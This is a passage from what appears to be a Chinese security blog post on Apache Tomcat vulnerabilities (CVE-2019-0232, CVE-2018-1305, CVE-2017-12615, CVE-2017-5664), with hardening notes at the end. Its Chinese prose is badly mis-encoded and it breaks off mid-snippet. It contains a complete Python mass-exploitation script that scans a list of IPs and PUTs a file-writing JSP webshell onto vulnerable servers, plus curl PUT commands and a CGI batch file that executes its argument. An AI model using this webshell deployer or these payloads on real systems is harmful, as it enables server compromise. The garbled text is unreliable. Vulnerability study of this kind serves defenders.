<h4 id="0x07-CVE-2019-0232-è¿œç¨‹ä»£ç æ‰§è¡Œ"><a href="#0x07-CVE-2019-0232-è¿œç¨‹ä»£ç æ‰§è¡Œ" class="headerlink" title="0x07 CVE-2019-0232(è¿œç¨‹ä»£ç æ‰§è¡Œ)"></a>0x07 CVE-2019-0232(è¿œç¨‹ä»£ç æ‰§è¡Œ)</h4><p>æ¼æ´æè¿°:åœ¨å¯ç”¨äº†enableCmdLineArgumentsçš„<code>Windows</code>ä¸Šè¿è¡Œæ—¶ï¼Œç”±äºJREå°†å‘½ä»¤è¡Œå‚æ•°ä¼ é€’ç»™Windowsçš„æ–¹å¼å­˜åœ¨é”™è¯¯ï¼ŒCGI Servletå¾ˆå®¹æ˜“å—åˆ°è¿œç¨‹æ‰§è¡Œä»£ç çš„æ”»å‡»ã€‚<br>CGI Servlet é»˜è®¤æ˜¯å…³é—­çš„åœ¨Tomcat ä»¥ä¸‹ç‰ˆæœ¬å°†è§¦å‘æ­¤æ¼æ´ã€‚</p>
<p><em>æ¼æ´è§¦å‘æ¡ä»¶ï¼š</em></p>
<ul>
<li>1.Windows</li>
<li>2.å¯ç”¨äº†CGIServletï¼ˆé»˜è®¤ä¸ºå…³é—­ï¼‰</li>
<li>3.å¯ç”¨äº†enableCmdLineArgumentsï¼ˆTomcat 9.0.*ç‰ˆæœ¬é»˜è®¤ä¸ºå…³é—­ï¼‰</li>
</ul>
<p>å½±å“ç‰ˆæœ¬ï¼š</p>
<ul>
<li>Apache Tomcat 9.0.0.M1to 9.0.17</li>
<li>Apache Tomcat 8.5.0 to 8.5.39</li>
<li>Apache Tomcat 7.0.0 to 7.0.93</li>
</ul>
<p>ç¯å¢ƒé…ç½®:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#Modify Configuration</span><br><span class="line">#(1)web.xml</span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>cgi<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.catalina.servlets.CGIServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>debug<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>0<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>cgiPathPrefix<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>WEB-INF/cgi-bin<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>executable<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-value</span>&gt;</span><span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>5<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- The mapping for the CGI Gateway servlet --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>cgi<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/cgi-bin/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#(2) hello.bat</span><br><span class="line">@echo off</span><br><span class="line">@REM:whatever the content in batch file</span><br><span class="line">echo Content-Type: text/plain</span><br><span class="line">echo.</span><br><span class="line">set foo=%~1</span><br><span class="line">%foo%</span><br></pre></td></tr></table></figure></p>
<p>æ¼æ´éªŒè¯ï¼šæœ¬åœ°æµ‹è¯•éªŒè¯å¦‚ä¸‹<br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190911113707.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190911113707.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p>å®‰å…¨å»ºè®®:</p>
<ul>
<li>ç‰ˆæœ¬æ’æŸ¥:å¦‚æœè§£å‹åçš„Tomcatç›®å½•åç§°è¢«ä¿®æ”¹è¿‡æˆ–è€…é€šè¿‡<code>Windows Service Installer</code>æ–¹å¼å®‰è£…ï¼Œå¯ä½¿ç”¨è½¯ä»¶è‡ªå¸¦çš„versionæ¨¡å—æ¥è·å–å½“å‰çš„ç‰ˆæœ¬ã€‚</li>
</ul>
<p>ç¯å¢ƒå‚è€ƒ:<a href="https://github.com/pyn3rd/CVE-2019-0232" target="_blank" rel="noopener">https://github.com/pyn3rd/CVE-2019-0232</a></p>
<hr>

<h4 id="0x08-CVE-2018-1305-æƒé™ç»•è¿‡"><a href="#0x08-CVE-2018-1305-æƒé™ç»•è¿‡" class="headerlink" title="0x08 CVE-2018-1305(æƒé™ç»•è¿‡)"></a>0x08 CVE-2018-1305(æƒé™ç»•è¿‡)</h4><p>æè¿°:Java EE æä¾›äº†ç±»ä¼¼ ACL æƒé™æ£€æŸ¥çš„æ³¨è§£ï¼Œå¯ä»¥ç›´æ¥ç”¨äºä¿®é¥° Java Servletï¼Œç”¨äºå¯¹ Servlet è¿›è¡Œ ACL ä¿æŠ¤ã€‚<br>CVEç¼–å·:</p>
<ul>
<li>CVE-2018-1305</li>
<li>CVE-2018-1304</li>
</ul>
<p>ç°å‡è®¾æœ‰ä¸¤ä¸ª Servletï¼š<br>  Servlet1ï¼Œè®¿é—®è·¯å¾„ä¸º /servlet1/<em><br>  Servlet2ï¼Œè®¿é—®è·¯å¾„ä¸º /servlet1/servlet2/</em></p>
<p>Servlet1 ä¸Šæœ‰å¦‚ä¸‹å›¾çš„ Security Constraintï¼ˆç®€å•ç†è§£å°±æ˜¯ ACLï¼‰,Servlet2 ä¸Šå¹¶æ²¡æœ‰ ACLã€‚<br>ç„¶è€Œå› ä¸º Servlet2 çš„è®¿é—® url ä½äº Servlet1 çš„ä¸‹ä¸€çº§ï¼ˆ/servlet1/servlet2 æ˜¯ /servlet1/ çš„ â€œå­ç›®å½•â€ï¼‰ï¼Œæ‰€ä»¥ Tomcat ä¸­æ­£å¸¸çš„ä»£ç é€»è¾‘åº”è¯¥æ˜¯ï¼Œè™½ç„¶ Servlet2 ä¸Šé¢æ²¡æœ‰ ACLï¼Œä½†æ˜¯ Servlet2 åº”è¯¥ç»§æ‰¿ Servlet1 çš„ ACLã€‚</p>
<p>æ­£å¸¸æƒ…å†µåº”è¯¥æ˜¯ï¼š<br>  å…ˆè®¿é—® /servlet1ï¼Œè¿”å› 403ï¼Œå› ä¸ºè¯·æ±‚è¢« ACL æ‹¦æˆªäº†<br>  å†è®¿é—® /servlet1/servlet2ï¼Œè¿”å› 403ï¼Œå› ä¸ºè¯·æ±‚è¢« ACL æ‹¦æˆª</p>
<p><em>é‚£ä¹ˆå®é™…çš„é—®é¢˜åœ¨å“ªé‡Œï¼Ÿ</em><br>Tomcat åœ¨æ¥æ”¶åˆ° Servlet è®¿é—®è¯·æ±‚åï¼Œåœ¨å®ä¾‹åŒ– Servlet å¯¹è±¡ä¹‹å‰ï¼Œä¼šå…ˆæ‰«æè¢«è®¿é—®çš„ Servlet ä¸Šæ³¨å†Œçš„ ACLã€‚å¦‚æœå­˜åœ¨ ACLï¼Œåˆ™å°† ACL è§„åˆ™æ·»åŠ åˆ°ä¸€ä¸ª Context å”¯ä¸€çš„åˆ—è¡¨ä¸­ã€‚éšåå†æ£€æŸ¥å½“å‰è®¿é—®çš„ Servlet æ˜¯å¦è¢« ACL ä¿æŠ¤ã€‚</p>
<ul>
<li>ACL æ‰«æ org.apache.catalina.authenticator.AuthenticatorBase#invokeï¼š</li>
</ul>
<p>å®ä¾‹æµç¨‹:</p>
<ul>
<li>è®¿é—® <a href="http://localhost:8080/CVE-2018-1305/servlet1/servlet2ï¼Œæ­¤æ—¶" target="_blank" rel="noopener">http://localhost:8080/CVE-2018-1305/servlet1/servlet2ï¼Œæ­¤æ—¶</a> servlet1 çš„ ACL æ²¡è¢« Tomcat åŠ è½½ï¼Œæ‰€ä»¥è®¿é—®æˆåŠŸ</li>
<li>è®¿é—® <a href="http://localhost:8080/CVE-2018-1305/servlet1ï¼Œè¢«æ‹’ç»è®¿é—®äº†ï¼Œæ­¤æ—¶" target="_blank" rel="noopener">http://localhost:8080/CVE-2018-1305/servlet1ï¼Œè¢«æ‹’ç»è®¿é—®äº†ï¼Œæ­¤æ—¶</a> Tomcat åŠ è½½äº† servlet1 çš„ ACL</li>
<li>å†è®¿é—® <a href="http://localhost:8080/CVE-2018-1305/servlet1/servlet2ï¼Œè¢«æ‹’ç»è®¿é—®äº†ï¼Œå› ä¸º" target="_blank" rel="noopener">http://localhost:8080/CVE-2018-1305/servlet1/servlet2ï¼Œè¢«æ‹’ç»è®¿é—®äº†ï¼Œå› ä¸º</a> Tomcat å·²ç»åŠ è½½äº† servlet1 çš„ ACL</li>
</ul>
<figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190911161725.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190911161725.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure>
<p><br></p>
<h4 id="0x09-CVE-2017-12615-æ–‡ä»¶PUTä¸Šä¼ "><a href="#0x09-CVE-2017-12615-æ–‡ä»¶PUTä¸Šä¼ " class="headerlink" title="0x09 CVE-2017-12615(æ–‡ä»¶PUTä¸Šä¼ )"></a>0x09 CVE-2017-12615(æ–‡ä»¶PUTä¸Šä¼ )</h4><p>æ¼æ´æè¿°: åˆ©ç”¨Tomcatå…è®¸PUTåè®®è¿›è¡Œä¸Šä¼ æ¶æ„çš„åº”ç”¨ç¨‹åº;<br>æ¼æ´ç¼–å·ï¼šCVE-2017-12615<br>å½±å“å¹³å°ï¼šWindows&amp;Linux<br>å½±å“ç‰ˆæœ¬ï¼šApache Tomcat 7.0.0 - 7.0.81</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! -*- coding:utf-8 -*- </span></span><br><span class="line"><span class="keyword">import</span> httplib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time,codecs</span><br><span class="line"></span><br><span class="line">UrlFile=file(<span class="string">'./tomcatIP.txt'</span>) <span class="comment">#urlåˆ—è¡¨</span></span><br><span class="line">fp= codecs.open(<span class="string">"./tomcat_success.txt"</span>,<span class="string">"a"</span>) <span class="comment">#æˆåŠŸåˆ©ç”¨åå†™å…¥çš„æ–‡ä»¶ï¼Œæ”¯æŒå†™å…¥ä¸­æ–‡å­—ç¬¦çš„æ–¹å¼</span></span><br><span class="line"></span><br><span class="line">body = <span class="string">'''&lt;%@ page language="java" pageEncoding="gbk"%&gt;&lt;jsp:directive.page import="java.io.File"/&gt;&lt;jsp:directive.page import="java.io.OutputStream"/&gt;&lt;jsp:directive.page import="java.io.FileOutputStream"/&gt;&lt;% int i=0;String method=request.getParameter("act");if(method!=null&amp;&amp;method.equals("yoco"))&#123;String url=request.getParameter("url");String text=request.getParameter("smart");File f=new File(url);if(f.exists())&#123;f.delete();&#125;try&#123;OutputStream o=new FileOutputStream(f);o.write(text.getBytes());o.close();&#125;catch(Exception e)&#123;i++;%&gt;0&lt;%&#125;&#125;if(i==0)&#123;%&gt;1&lt;%&#125;%&gt;&lt;form action='?act=yoco' method='post'&gt;&lt;input size="100" value="&lt;%=application.getRealPath("/") %&gt;" name="url"&gt;&lt;br&gt;&lt;textarea rows="20" cols="80" name="smart"&gt;'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">       <span class="keyword">print</span> <span class="string">'''</span></span><br><span class="line"><span class="string">       ----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">        ç¨‹åºåç§°ï¼šTomcat putä¸Šä¼ æ¼æ´åˆ©ç”¨ç¨‹åº</span></span><br><span class="line"><span class="string">        æ¼æ´ç¼–å·ï¼šCVE-2017-12615</span></span><br><span class="line"><span class="string">        å½±å“å¹³å°ï¼šWindows&amp;Linux</span></span><br><span class="line"><span class="string">        å½±å“ç‰ˆæœ¬ï¼šApache Tomcat 7.0.0 - 7.0.81</span></span><br><span class="line"><span class="string">        ç¨‹åºç”¨æ³•ï¼š</span></span><br><span class="line"><span class="string">       \ttomcatIP.txt é‡Œé¢è®¾ç½®éœ€è¦æ‰«æçš„IPåœ°å€ï¼Œå¦‚:10.110.123.30:8080 å›è½¦åè¾“å…¥ä¸‹ä¸€ä¸ªIPåœ°å€</span></span><br><span class="line"><span class="string">       \tpython tomcat_put.py</span></span><br><span class="line"><span class="string">       \tæˆåŠŸä¼šè‡ªåŠ¨éƒ¨ç½²webshell éƒ¨ç½²åè®¿é—® http://10.110.123.30:8080/test11.jsp</span></span><br><span class="line"><span class="string">       -----------------------------------------------------------------------------------------\n'''</span></span><br><span class="line">       urllist=[]</span><br><span class="line">       <span class="keyword">print</span> <span class="string">"\ttomcat url list:"</span>,</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">          line = UrlFile.readline()</span><br><span class="line">          <span class="keyword">if</span> len(line) == <span class="number">0</span>: <span class="comment"># Zero length indicates EOF</span></span><br><span class="line">             <span class="keyword">break</span></span><br><span class="line">          line=line.strip()  <span class="comment">#å»é™¤ç©ºæ ¼</span></span><br><span class="line">          <span class="keyword">print</span> line</span><br><span class="line">          urllist.append(line)</span><br><span class="line">       UrlFile.close()</span><br><span class="line"></span><br><span class="line">       <span class="keyword">print</span> <span class="string">'\n'</span></span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> urllist:</span><br><span class="line">          conn = httplib.HTTPConnection(i)</span><br><span class="line">          conn.request(method=<span class="string">'OPTIONS'</span>, url=<span class="string">'/ffffzz'</span>)</span><br><span class="line">          headers = dict(conn.getresponse().getheaders())</span><br><span class="line">          <span class="keyword">if</span> <span class="string">'allow'</span> <span class="keyword">in</span> headers <span class="keyword">and</span> \</span><br><span class="line">             headers[<span class="string">'allow'</span>].find(<span class="string">'PUT'</span>) &gt; <span class="number">0</span> :</span><br><span class="line">             conn.close()</span><br><span class="line">             conn = httplib.HTTPConnection(i)</span><br><span class="line">             url = <span class="string">"/"</span> + <span class="string">"test11"</span>+<span class="string">'.jsp/'</span></span><br><span class="line">             conn.request( method=<span class="string">'PUT'</span>, url= url, body=body)</span><br><span class="line">             res = conn.getresponse()</span><br><span class="line">             <span class="keyword">if</span> res.status  == <span class="number">201</span> :</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'shell:'</span>, <span class="string">'http://'</span> + sys.argv[<span class="number">1</span>] + url[:<span class="number">-7</span>]</span><br><span class="line">                info=<span class="string">'\t[*]shell:'</span>+<span class="string">'http://'</span> +i + url[:<span class="number">-1</span>]+<span class="string">"\n"</span></span><br><span class="line">                <span class="keyword">print</span> info</span><br><span class="line">                fp.write(info)</span><br><span class="line">                fp.flush()</span><br><span class="line">             <span class="keyword">elif</span> res.status == <span class="number">204</span> :</span><br><span class="line">                info=<span class="string">'http://'</span> +i + url[:<span class="number">-1</span>]</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[*]file exists! %s'</span> %info</span><br><span class="line">             <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'\t[*]error!'</span></span><br><span class="line">             conn.close()</span><br><span class="line">          <span class="keyword">else</span>: </span><br><span class="line">             <span class="keyword">print</span> <span class="string">'\t[*]server not vulnerable!'</span></span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">      <span class="keyword">print</span> <span class="string">'\tError:'</span>, e</span><br></pre></td></tr></table></figure>
<p><br></p>
<h4 id="0x10-CVE-2017-5664-æ–‡ä»¶PUTä¸Šä¼ "><a href="#0x10-CVE-2017-5664-æ–‡ä»¶PUTä¸Šä¼ " class="headerlink" title="0x10 CVE-2017-5664(æ–‡ä»¶PUTä¸Šä¼ )"></a>0x10 CVE-2017-5664(æ–‡ä»¶PUTä¸Šä¼ )</h4><p>æè¿°:è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒé¸¡è‚‹å¹¶ä¸”ä¸PUTç›¸å…³çš„ä¸€ä¸ªæ¼æ´(æ‰€ä»¥éœ€è¦readOnly ä¸º false)æ¶‰åŠåˆ° DefaultServlet(ä¸»è¦è®²è§£)) ä¸ WebdavServletã€‚<br>è§¦å‘è¦æ±‚ï¼š</p>
<ul>
<li>éœ€è¦ DefaultServlet readonly å€¼ä¸º falseï¼Œé»˜è®¤ä¸ºtrueã€‚</li>
<li>è¦æ±‚æœåŠ¡ç«¯é…ç½®äº†è‡ªå®šä¹‰çš„é™æ€é”™è¯¯é¡µé¢ï¼Œè€Œä¸”å®¢æˆ·ç«¯èƒ½å¤Ÿè§¦å‘ç›¸åº”çš„é”™è¯¯æ¥ä½¿è¯·æ±‚è¢«è½¬å‘è‡³é”™è¯¯é¡µé¢ã€‚</li>
</ul>
<p><em>èƒŒæ™¯çŸ¥è¯†</em><br>DefaultServletä½œç”¨</p>
<ul>
<li>JspServlet çš„ä½œç”¨æ˜¯å¤„ç†jsp ä¸jspx æ–‡ä»¶çš„è¯·æ±‚ï¼Œé‚£ä¹ˆé jsp jspx æ–‡ä»¶è¯·æ±‚ å°±æ˜¯ç”± DefaultServlet æ¥å¤„ç†çš„ï¼ˆå…¶å®æœ‰åˆ«çš„æƒ…å†µï¼‰,è¿™é‡Œç®€å•åœ°è®¤ä¸ºé™æ€æ–‡ä»¶ä¼šäº¤ç”±DefaultServlet æ¥å¤„ç†å§ã€‚</li>
<li>DefaultServlet å¯ä»¥å¤„ç† PUT æˆ– DELETEè¯·æ±‚ï¼Œå‰æè¦æ±‚æ˜¯readOnly ä¸º falseï¼Œç„¶è€Œé»˜è®¤å€¼æ˜¯ trueã€‚<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$vim</span> conf/web.xml</span><br><span class="line"><span class="comment">#å¼€å¯äº†DefaultServlet å¤„ç† PUT è¯·æ±‚çš„åŠŸèƒ½</span></span><br><span class="line">&lt;init-param&gt;</span><br><span class="line">  &lt;param-name&gt;<span class="built_in">readonly</span>&lt;/param-name&gt;</span><br><span class="line">  &lt;param-value&gt;<span class="literal">false</span>&lt;/param-value&gt;</span><br><span class="line">&lt;/init-param&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#è‡ªå®šä¹‰404 é”™è¯¯é¡µé¢</span></span><br><span class="line">&lt;error-page&gt;</span><br><span class="line">  &lt;error-code&gt;404&lt;/error-code&gt;</span><br><span class="line">  &lt;location&gt;/404.html&lt;/location&gt;</span><br><span class="line">&lt;/error-page&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>åˆ©ç”¨æ¡ˆä¾‹:<br>1.è¯·æ±‚å¿…é¡»åˆ°è¾¾DefaultServlet æ‰èƒ½è¿›è¡Œ PUT æ“ä½œï¼Œè¿™ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬èƒ½ä¸Šä¼ çš„æ–‡ä»¶çš„ç±»å‹æ˜¯å—é™åˆ¶çš„ï¼Œæ¯”å¦‚é»˜è®¤æƒ…å†µä¸‹æˆ‘ä»¬æ˜¯ä¸èƒ½ä¸Šä¼ jsp æˆ–è€…jspx çš„ã€‚<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æœ¬æ„æ˜¯å°† aaa.jsp PUTè‡³ç›®æ ‡æœåŠ¡å™¨ï¼Œä¿å­˜ä¸ºaaa.jsp</span></span><br><span class="line">curl -i -T aaa.jsp http://localhost:8080/CVE-2017-5664/aaa.jsp</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯è¯·æ±‚å°†ä¼šè¢« JspServlet å¤„ç†ï¼Œè€Œä¸æ˜¯è¢«DefaultServlet å¤„ç†,è€ŒåˆJspServletæ˜¯ä¸å¤„ç† PUT è¯·æ±‚çš„(å°†å…¶è½¬å˜æˆä¸ºPUTè¯·æ±‚),ä½†æ˜¯æ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä¸Šä¼ é™æ€æ–‡ä»¶<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æ¯”å¦‚åœ¨readOnly ä¸º false çš„æ—¶å€™é€šè¿‡å¦‚ä¸‹å‘½ä»¤ä¸Šä¼ aaa.txt</span></span><br><span class="line">curl -i -T aaa.txt http://localhost:8080/CVE-2017-5664/aaa.txt</span><br></pre></td></tr></table></figure><br>å› ä¸ºä»¥ä¸Šè¯·æ±‚ä¼šè¢« DefaultServlet å¤„ç†ï¼Œæ‰€ä»¥PUT æ“ä½œä¼šæˆåŠŸã€‚</p>
<p>2.åˆ©ç”¨æ€è·¯<br>Java Servlet è§„èŒƒä¸­è¦æ±‚ï¼Œå½“è®¿é—®çš„èµ„æºå‡ºç°å¦‚ 404 æˆ– 500 ä¹‹ç±»çš„é”™è¯¯ï¼Œå¹¶ä¸”åŒæ—¶æœåŠ¡ç«¯é…ç½®äº†ç›¸åº”çš„é”™è¯¯é¡µé¢æ—¶ï¼ŒåŸå§‹è¯·æ±‚åº”è¯¥è¢«forward åˆ°é”™è¯¯é¡µé¢ã€‚<br>å¦‚æœ DefaultServlet é…ç½®çš„readOnly ä¸º falseï¼Œ<code>Â·åˆ™ä¸€ä¸ªæ¶æ„çš„è¯·æ±‚æœ‰å¯èƒ½åˆ é™¤æˆ–è€…æ›¿æ¢æ‰é”™è¯¯é¡µé¢æ–‡ä»¶Â·</code>ã€‚</p>
<p>å¦‚æœç»™åº”ç”¨é…ç½®äº†ä¸€ä¸ªè‡ªå®šä¹‰äº† 404.html é¡µé¢ï¼Œå¦‚æœåŸå§‹è¯·æ±‚é”™è¯¯å°±ä¼šè¢« forward åˆ° 404.html é¡µé¢ , DefaultServlet å‘ç°è¯·æ±‚æ˜¯ä¸€ä¸ª PUT è¯·æ±‚ï¼Œæ‰€ä»¥ç›´æ¥åˆ©ç”¨ä»å®¢æˆ·ç«¯ä¼ æ¥çš„é™æ€æ–‡ä»¶æ•°æ®å°†/404.html é‡å†™äº†ã€‚<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#é‡å†™åŸå§‹ 404.html</span></span><br><span class="line">Curl -i -T &lt;<span class="built_in">echo</span> 404 modified&gt; http://localhost/poc.jsp</span><br><span class="line"></span><br><span class="line"><span class="comment">#æŸ¥çœ‹404.htmlçš„å†…å®¹å‘ç°å†™å…¥æˆåŠŸ</span></span><br><span class="line">cat 404.html</span><br><span class="line"></span><br><span class="line"><span class="comment">#å†æ¬¡è¿›è¡Œè®¿é—®ä¸å­˜åœ¨çš„jspæ–‡ä»¶</span></span><br><span class="line">curl http://localhost/notFound.jsp</span><br></pre></td></tr></table></figure><br><figure class="image-box">
                <a rel=Tomcatè„†å¼±æ€§å¸¸è§æ¼æ´æŸ¥çœ‹éªŒè¯ href="https://img.weiyigeek.top/2019/1/20190916172727.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://img.weiyigeek.top/2019/1/20190916172727.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<hr>

<h4 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h4><p><strong>Tomcatå®‰å…¨æ¼æ´ä¿®æ”¹æ€»ç»“</strong><br>1.åˆ é™¤webappsç›®å½•ä¸­çš„docsã€examplesã€host-managerã€managerç­‰æ­£å¼ç¯å¢ƒç”¨ä¸ç€çš„ç›®å½•ï¼Œè¿™ä¸€æ­¥å°±å¯ä»¥è§£å†³å¤§éƒ¨åˆ†æ¼æ´ã€‚<br>æ–¹æ³•æ˜¯å°†%tocmat_home%/conf/Catalina/localhostç›®å½•ä¸‹çš„manager.xmlåˆ é™¤æ‰</p>
<p><br></p>
<p>2.è§£å†³â€slow http denial of service attackâ€æ¼æ´<br>åŸç†ï¼šåˆ©ç”¨http-postçš„æ—¶å€™ï¼ŒæŒ‡å®šä¸€ä¸ªéå¸¸å¤§çš„content-lengthï¼Œç„¶åä»¥å¾ˆä½çš„é€Ÿåº¦å‘åŒ…ï¼Œæ¯”å¦‚10-100så‘ä¸€ä¸ªå­—èŠ‚ï¼Œè®©è¿™ç§è¿æ¥ä¸æ–­å¼€ï¼Œè¿™æ ·å½“å®¢æˆ·ç«¯è¿æ¥å¤šäº†åï¼Œå ç”¨äº†webserverçš„æ‰€æœ‰å¯ç”¨è¿æ¥ï¼Œä»è€Œå¯¼åˆ¶DOSï¼Œå±äºä¸€ç§æ‰“æ‹’ç»æœåŠ¡æ”»å‡»ã€‚<br>è§£å†³æ–¹æ³•ï¼šæ‰“å¼€server.xmlæ‰¾åˆ°ï¼Œå°†å…¶ä¸­çš„connectionTimeout=â€20000â€æ”¹ä¸º8000ï¼Œå…¶å•ä½ä¸ºmsã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Connector port&#x3D;&quot;8080&quot; protocol&#x3D;&quot;HTTP&#x2F;1.1&quot;</span><br><span class="line">ã€€ã€€connectionTimeout&#x3D;&quot;20000&quot;</span><br><span 